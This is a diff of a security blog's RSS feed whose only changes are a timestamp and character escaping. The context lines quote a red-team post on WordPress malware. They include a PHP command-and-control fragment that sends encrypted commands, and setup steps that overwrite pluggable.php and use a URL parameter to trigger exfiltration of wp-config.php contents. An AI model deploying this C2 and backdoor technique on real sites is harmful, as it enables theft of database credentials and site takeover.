@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/redteam/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Mon, 24 Aug 2020 03:12:25 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 24 Aug 2020 03:18:39 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -200,7 +200,7 @@ if ( !$remote_client_requirements ) exit(0);
 if ( is_array($remote_client_requirements) &amp;&amp; isset($remote_client_requirements['key']) &amp;&amp; isset($remote_client_requirements['type']) ){
     $session_key = base64_decode($remote_client_requirements['key']);
     $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
-    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
+    $response = json_encode(array( 'payload' =&#x3E; base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
     //add some fancy logging in order to know the client and type+format of exfiltrated data 
     echo $response;
 }
@@ -216,7 +216,7 @@ exit();</code></pre>
 
 
 
-<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt > /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul>
+<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt &gt; /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul>
 
 
 
